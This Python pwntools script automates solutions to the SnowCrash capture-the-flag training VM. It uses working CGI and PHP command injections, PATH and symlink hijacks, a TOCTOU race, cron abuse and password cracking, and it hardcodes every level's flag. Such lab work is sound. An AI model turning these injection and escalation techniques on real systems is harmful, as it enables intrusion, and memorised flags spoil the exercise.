#!/usr/bin/env python2
#TODO: update to most recent version of pwntools which supports python3
import re
import sys
from pwn import *

context.log_level = "INFO"
flags = []
flag_reg = re.compile("\w{25,39}")
ref_flags = [
    "x24ti5gi3x0ol2eh4esiuxias",
    "f2av5il02puano7naaf6adaaf",
    "kooda2puivaav1idi4f57q8iq",
    "qi0maab88jeaj46qoumi7maus",
    "ne2searoevaevoem4ov4ar8ap",
    "viuaaale9huek52boumoomioc",
    "wiok45aaoguiboiki2tuin6ub",
    "fiumuikeil55xe9cu4dood66h",
    "25749xKZ8L7DkSCwJkT9dyv6f",
    "s5cAJpM8ev6XHw998pRWG728z",
    "feulo4b72j7edeahuete3no7c",
    "fa6v5ateaw21peobuub8ipe6s",
    "g1qKMiRpXf53AWhDaU7FEkczr",
    "2A31L79asukciNyi8uppkEuSx",
    "7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ",
]
rhost = "SnowCrash"
rport = 4242


def add_flag(res, check):
    global flags
    if res is not None:
        match = flag_reg.search(res)
        if match is not None and match.group(0) is not None and "AAAAA" not in match.group(0):
            found = match.group(0)
            flags.append(found)
            with open("level{:02d}/flag".format(check), "w+") as fw:
                fw.write(found + "\n")
            with context.local(log_level="INFO"):
                log.success("Level{0:02d} - Found flag{0:02d}: {1}".format(check, found))


def get_flag_as_user(shell, usr, passwd):
    pr = shell.run("su " + usr)
    pr.sendlineafter("Password: ", passwd)
    with context.local(log_level="INFO"):
        pr.recvline()
        ln = pr.recvline()
        if "Don't forget to launch getflag !" not in ln:
            log.info(ln)
    pr.sendlineafter(usr + "@SnowCrash:~$ ", "getflag")
    add_flag(pr.recvline(keepends=False), int(usr[-2:]))
    pr.close()


# level00@SnowCrash
# find any interesting files and get 'em
# very rudimentary monoalphabetic substution cipher
def level00():

    def rot_alpha(n):
        from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans
        lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
        return lambda s: s.translate(lookup)

    sh = ssh("level00", rhost, password="level00", port=rport)
    johnpath = sh["find / -user flag00 2>/dev/null"].splitlines()[0]
    john = sh["cat " + johnpath]
    hnjo = rot_alpha(11)(john)
    with context.local(log_level="INFO"):
        log.success("Level00 - rot11({}) -> {}".format(john, hnjo))
    get_flag_as_user(sh, "flag00", hnjo)
    sh.close()


# level01@SnowCrash
# descrypt, traditional crypt(3), is not a secure type of encryption
# JohnTheRipper makes short work of it
def level01():
    sh = ssh("level01", rhost, password=flags[0], port=rport)
    sh["grep 'flag01' /etc/passwd > /tmp/pass"]
    sh.download_file("/tmp/pass")
    passwd = re.search(
        "flag01:(\w*):3001", process(["john", "--show", "pass"]).recvall()
    ).group(1)
    get_flag_as_user(sh, "flag01", passwd)
    process(["rm", "-f", "pass"]).recvall()
    sh.close()


# level02@SnowCrash
# packet capture file information extraction, tshark to the rescue
def level02():
    sh = ssh("level02", rhost, password=flags[1], port=rport)
    sh.download_file("level02.pcap")
    tshk = process(["tshark", "-z", "follow,tcp,raw,0,30-50", "-r", "level02.pcap"])
    awk = process(["awk", "$0 ~ /^[0-9a-f]{2}$/ { print $1 }"])
    tshk.connect_output(awk)
    pckts = [i for i in awk.recvall().split("\n")][:-1]
    tshk.close()
    awk.close()
    while "7f" in pckts:
        i = pckts.index("7f")
        pckts.pop(i)
        pckts.pop(i - 1)
    passwd = ""
    for i in [chr(int(j, 16)) for j in pckts[:-1]]:
        passwd += i
    with context.local(log_level="INFO"):
        log.success("Level02 - flag02 password: {}".format(passwd))
    get_flag_as_user(sh, "flag02", passwd)
    process(["rm", "-f", "level02.pcap"]).recvall()
    sh.close()


# level03@SnowCrash
# symlinks and PATH shenanigans
def level03():
    sh = ssh("level03", rhost, password=flags[2], port=rport)
    sh["ln -s /bin/getflag /tmp/echo"]
    add_flag(sh["env PATH=/tmp:$PATH ./level03"], 3)
    sh["rm -f /tmp/echo"]
    sh.close()


# level04@SnowCrash
# http post requests, and reasons why you shouldn't use backticks in perl CGI scripts
def level04():
    req = process(
        [
            "http",
            "--pretty",
            "none",
            "--ignore-stdin",
            "-b",
            "-f",
            "192.168.56.104:4747/level04.pl",
            "x=;getflag",
        ]
    )
    add_flag(req.recvall(), 4)
    req.close()


# level05@SnowCrash
# cronjobs and/or init.rc
def level05():
    from datetime import datetime

    def get_time_left(now):
        sec = 0
        fmt = ""
        if now.minute % 2 == 0:
            fmt += "1 minute"
            sec += 60
        tmp = 60 - now.second
        sec += tmp
        if tmp != 0:
            if now.minute % 2 == 0:
                fmt += " and "
            fmt += "{} second".format(tmp)
            if tmp != 1:
                fmt += "s"
        return "Should complete in {}".format(fmt), sec

    out, sec = get_time_left(datetime.now())
    # print out, "\t [%d]" % sec
    with log.progress("Level05 - waiting for cronjob") as p:
        for i in range(sec-1, 0, -1):
            p.status(" %d" % i)
            replacements.sleep(1)

    sh = ssh("level05", rhost, password=flags[4], port=rport)
    res = sh[
        "rm -f /tmp/flag;"
        "printf '#!/bin/sh\ngetflag>/tmp/flag\n' > /opt/openarenaserver/snjort;"
        "chmod +x /opt/openarenaserver/snjort;"
        "while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done"
    ]
    add_flag(res, 5)
    sh["rm -f /tmp/flag"]
    sh.close()


# level06@SnowCrash
# horrendous php regular expressions
# also seems to be just a slightly obfuscated carbon copy of a level from Protostar
def level06():
    sh = ssh("level06", rhost, password=flags[5], port=rport)
    res = sh["echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument"]
    add_flag(res, 6)
    sh["rm -f /tmp/arg"]
    sh.close()


# level07@SnowCrash
# environment variable exploit
def level07():
    sh = ssh("level07", rhost, password=flags[6], port=rport)
    res = sh["env LOGNAME=\;getflag ./level07"]
    add_flag(res, 7)
    sh.close()


# level08@SnowCrash
# symlink permission abuse
def level08():
    sh = ssh("level08", rhost, password=flags[7], port=rport)
    passwd = sh["ln -fs $HOME/token /tmp/test; ./level08 /tmp/test"]
    with context.local(log_level="INFO"):
        log.success("Level08 - flag08 password: {}".format(passwd))
    get_flag_as_user(sh, "flag08", passwd)
    sh["rm -f /tmp/test"]
    sh.close()


# level09@SnowCrash
# simple substitution cipher based on index of char in string
def level09():
    sh = ssh("level09", rhost, password=flags[8], port=rport)
    token = sh.download_data("token")
    passwd = ""
    for i in xrange(len(token) - 1):
        passwd += chr(ord(token[i]) - i)
    with context.local(log_level="INFO"):
        log.success("Level09 - flag09 password: {}".format(passwd))
    get_flag_as_user(sh, "flag09", passwd)
    sh["exit"]
    sh.close()


# level10@SnowCrash
# TOCTOU or Time Of Check Time Of Use exploit
def level10():
    sh = ssh("level10", rhost, password=flags[9], port=rport)
    m = None
    script = [
        "#!/bin/bash\n"
        " pkill nc\n"
        " echo ''>/tmp/flog\n"
        " touch /tmp/l10\n"
        " while [ -z $(egrep '\\w{25}' /tmp/flog) ]; do\n"
        " nc -l 6969 | tee -a /tmp/flog &\n"
        " ln -sf /tmp/l10 /tmp/a &\n"
        " ./level10 /tmp/a 127.0.0.1 &\n"
        " ln -sf ~/token /tmp/a &\n"
        "done\n"
    ][0]
    sh[
        "rm -f /tmp/flag;"
        "printf '" + script + "' > /tmp/honk.sh;"
        "chmod +x /tmp/honk.sh"
    ]
    p = sh.process("/tmp/honk.sh")
    while m is None:
        res = p.recv()
        m = flag_reg.search(res)
    passwd = m.group(0)
    with context.local(log_level="INFO"):
        log.success("Level10 - flag10 password: {}".format(passwd))
    get_flag_as_user(sh, "flag10", passwd)
    sh["rm -f /tmp/flog /tmp/l10 /tmp/honk.sh /tmp/a"]
    sh.close()


# level11@SnowCrash
def level11():
    sh = ssh("level11", rhost, password=flags[10], port=rport)
    p = sh.process(["nc", "localhost", "5151"])
    p.sendlineafter("Password: ", ":;getflag>/tmp/flag11")
    p.close()
    res = sh["cat /tmp/flag11"]
    add_flag(res, 11)
    sh["rm -f /tmp/flag11"]
    sh.close()


# level12@SnowCrash
# perl CGI script with partially sanitized inputs
def level12():
    sh = ssh("level12", rhost, password=flags[11], port=rport)
    sh[
        "printf '#!/bin/bash\n"
        "getflag > /tmp/glag\n' > /tmp/GONK;"
        "chmod +x /tmp/GONK;"
        "curl localhost:4646/level12.pl?x=\`/*/gonk\`"
    ]
    res = sh["cat /tmp/glag"]
    add_flag(res, 12)
    sh["rm -f /tmp/glag /tmp/GONK"]
    sh.close()


# level13@SnowCrash
# patching bytes in a binary
def level13():
    sh = ssh("level13", rhost, password=flags[12], port=rport)
    res = sh[
        "xxd level13 > /tmp/level13;"
        "printf '90c\n"
        "0000590: e4f0 83ec 10e8 e6fd ffff 3ddd 0700 0074  ..........=....t\n"
        ".\n"
        "w\n"
        "q\n' | ed /tmp/level13;"
        "xxd -r /tmp/level13 > /tmp/goat;"
        "chmod +x /tmp/goat;"
        "/tmp/goat"
    ]
    add_flag(res, 13)
    sh["rm -f /tmp/level13 /tmp/goat"]
    sh.close()


# def ft_des(arg: str) -> str:
def ft_des(arg):
    s = bytearray("0123456")
    end = len(arg)
    ret = bytearray(arg)
    ii = 0
    nn = 0
    while ii < end:
        nn %= 6
        if ii % 2 == 0:
            for ll in range(s[nn]):
                ret[ii] = ret[ii] - 1
                if ret[ii] == 31:
                    ret[ii] = "~"
        else:
            for ll in range(s[nn]):
                ret[ii] = ret[ii] + 1
                if ret[ii] == 127:
                    ret[ii] = " "
        ii += 1
        nn += 1
    return str(ret)


# level14@SnowCrash
# cracking open the getflag binary
def level14():
    sh = ssh("level14", rhost, password=flags[13], port=rport)
    token = sh["strings /bin/getflag | egrep '^[[:print:]]{39}$'"]
    passwd = ft_des(token)
    get_flag_as_user(sh, "flag14", passwd)
    sh.close()


def main(args):
    # init
    global flags
    usage = "Usage: %s [0-14]" % args[0]
    num = None
    if len(args) == 2 and args[1].isdigit():
        num = int(args[1])
    else:
        num = ui.options("Which level would you like to run?", ["level{:02d}".format(i) for i in range(15)], -1)
    if num >= 0:
        flags = ref_flags[:num]
    # exec
    funs = [
        level00,
        level01,
        level02,
        level03,
        level04,
        level05,
        level06,
        level07,
        level08,
        level09,
        level10,
        level11,
        level12,
        level13,
        level14,
    ]
    if num != -1:
        funs[num]()
    else:
        for fun in funs:
            fun()


if __name__ == "__main__":
    main(sys.argv)

